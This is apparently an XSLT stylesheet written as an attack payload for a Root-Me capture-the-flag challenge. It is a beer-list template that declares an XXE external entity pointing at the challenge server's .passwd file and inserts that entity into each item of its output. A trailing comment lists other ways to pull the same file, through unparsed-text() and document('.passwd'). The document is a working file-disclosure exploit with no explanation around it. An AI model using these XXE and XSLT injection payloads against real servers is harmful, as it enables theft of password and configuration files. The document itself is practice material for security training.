<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [<!ENTITY include SYSTEM "/challenge01.root-me.org/web-serveur/ch50/.passwd">]>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
<xsl:for-each select="beers/beer">
  <div style="background-color:black;color:white;padding:4px">
    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <xsl:value-of select="price"/>
    </div>
  <div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
    <p>
    <xsl:value-of select="description"/>
    <span style="font-style:italic"> (<xsl:value-of select="prct"/> %)</span>
    </p>
	<p>&include;</p>
  </div>
  
  
  
</xsl:for-each>




</body>
</html> 

<!-- 
unparsed-text()
<xsl:text>Diferent text</xsl:text>
<p><xsl:copy-of select="document('.passwd')"/></p>
 -->